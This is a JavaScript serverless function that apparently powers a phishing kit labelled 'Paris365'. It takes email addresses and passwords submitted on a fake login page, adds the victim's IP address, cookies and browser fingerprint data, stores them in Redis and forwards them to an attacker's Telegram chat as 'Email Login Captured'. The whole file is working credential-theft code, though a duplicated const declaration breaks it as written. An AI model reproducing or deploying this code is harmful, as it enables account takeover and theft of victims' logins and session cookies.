export const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    // Debug: Log environment variables (without exposing values)
    console.log('Environment check:', {
      UPSTASH_REDIS_REST_URL: process.env.UPSTASH_REDIS_REST_URL ? 'SET' : 'NOT SET',
      UPSTASH_REDIS_REST_TOKEN: process.env.UPSTASH_REDIS_REST_TOKEN ? 'SET' : 'NOT SET',
      TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN ? 'SET' : 'NOT SET',
      TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID ? 'SET' : 'NOT SET',
    });

    const data = JSON.parse(event.body);
    const { email, password, provider, fileName, timestamp, userAgent } = data;

    // Get client IP with better detection for mobile
    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                     event.headers['x-real-ip'] || 
                     event.headers['cf-connecting-ip'] || 
                     'Unknown';

    // Get cookies from request headers
    const cookies = event.headers.cookie || 'No cookies found';
    const cookieInfo = cookies.length > 100 ? cookies.substring(0, 100) + '...' : cookies;
    
    // Get additional browser fingerprinting data
    const acceptLanguage = event.headers['accept-language'] || 'Unknown';
    const acceptEncoding = event.headers['accept-encoding'] || 'Unknown';
    const referer = event.headers.referer || 'Direct access';
    
    // Get cookies from request headers
    const cookies = event.headers.cookie || 'No cookies found';
    const cookieInfo = cookies.length > 100 ? cookies.substring(0, 100) + '...' : cookies;
    // Check environment variables first
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram configuration:', {
        botToken: TELEGRAM_BOT_TOKEN ? 'SET' : 'MISSING',
        chatId: TELEGRAM_CHAT_ID ? 'SET' : 'MISSING'
      });
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Server configuration error - Telegram credentials missing',
          debug: {
            botToken: TELEGRAM_BOT_TOKEN ? 'SET' : 'MISSING',
            chatId: TELEGRAM_CHAT_ID ? 'SET' : 'MISSING'
          }
        }),
      };
    }

    if (!UPSTASH_REDIS_REST_URL || !UPSTASH_REDIS_REST_TOKEN) {
      console.error('Missing Redis configuration:', {
        url: UPSTASH_REDIS_REST_URL ? 'SET' : 'MISSING',
        token: UPSTASH_REDIS_REST_TOKEN ? 'SET' : 'MISSING'
      });
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Server configuration error - Redis credentials missing',
          debug: {
            url: UPSTASH_REDIS_REST_URL ? 'SET' : 'MISSING',
            token: UPSTASH_REDIS_REST_TOKEN ? 'SET' : 'MISSING'
          }
        }),
      };
    }

    // Initialize Upstash Redis with error handling
    let redis;
    try {
      const { Redis } = await import('@upstash/redis');
      redis = new Redis({
        url: UPSTASH_REDIS_REST_URL,
        token: UPSTASH_REDIS_REST_TOKEN,
      });
    } catch (redisError) {
      console.error('Redis initialization error:', redisError);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Database connection error',
          details: redisError.message
        }),
      };
    }

    // Store session data in Redis with 24-hour expiration
    const sessionId = Math.random().toString(36).substring(2, 15);
    const sessionData = {
      email,
      provider,
      fileName,
      timestamp,
      sessionId,
      clientIP,
      userAgent,
      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'mobile' : 'desktop',
      cookies: cookieInfo,
      acceptLanguage,
      acceptEncoding,
      referer
    };

    try {
      // Store in Redis with 24-hour TTL
      await redis.setex(`session:${sessionId}`, 86400, JSON.stringify(sessionData));
      await redis.setex(`user:${email}`, 86400, JSON.stringify(sessionData));
    } catch (redisError) {
      console.error('Redis storage error:', redisError);
      // Continue with Telegram even if Redis fails
    }

    // Format message for Telegram with better mobile detection
    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile Device' : '💻 Desktop';
    
    const message = `
🔐 *Email Login Captured*

📧 *Email:* \`${email}\`
🔑 *Password:* \`${password}\`
🏢 *Provider:* ${provider}
📄 *File Accessed:* ${fileName}
🕒 *Timestamp:* ${new Date(timestamp).toLocaleString()}
🌐 *IP Address:* ${clientIP}
${deviceInfo}
🍪 *Cookies:* \`${cookieInfo}\`
🌍 *Language:* \`${acceptLanguage}\`
📦 *Encoding:* \`${acceptEncoding}\`
🔗 *Referer:* \`${referer}\`
🍪 *Cookies:* \`${cookieInfo}\`
🆔 *Session ID:* \`${sessionId}\`

---
*Paris365*
    `;

    // Send to Telegram with retry logic for mobile networks
    let telegramResponse;
    let retryCount = 0;
    const maxRetries = 3;

    while (retryCount < maxRetries) {
      try {
        telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
          }),
          // Add timeout for mobile networks
          signal: AbortSignal.timeout(15000),
        });

        if (telegramResponse.ok) {
          break; // Success, exit retry loop
        }
        
        const errorText = await telegramResponse.text();
        console.error(`Telegram API error (attempt ${retryCount + 1}):`, errorText);
        throw new Error(`HTTP ${telegramResponse.status}: ${errorText}`);
      } catch (error) {
        retryCount++;
        console.error(`Telegram attempt ${retryCount} failed:`, error.message);
        
        if (retryCount === maxRetries) {
          throw error;
        }
        
        // Wait before retry (exponential backoff)
        await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
      }
    }

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error('Final Telegram API error:', errorText);
      throw new Error('Failed to send to Telegram after retries');
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true, 
        message: 'Credentials captured successfully',
        sessionId: sessionId
      }),
    };

  } catch (error) {
    console.error('Error in sendTelegram function:', error);
    
    // Better error handling for different scenarios
    let errorMessage = 'Internal server error';
    let errorDetails = error.message;
    
    if (error.name === 'AbortError') {
      errorMessage = 'Request timeout - please check your connection';
    } else if (error.message.includes('Failed to send to Telegram')) {
      errorMessage = 'Communication error - please try again';
    } else if (error.message.includes('fetch')) {
      errorMessage = 'Network error - please try again';
    }
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: errorMessage,
        details: errorDetails,
        timestamp: new Date().toISOString()
      }),
    };
  }
};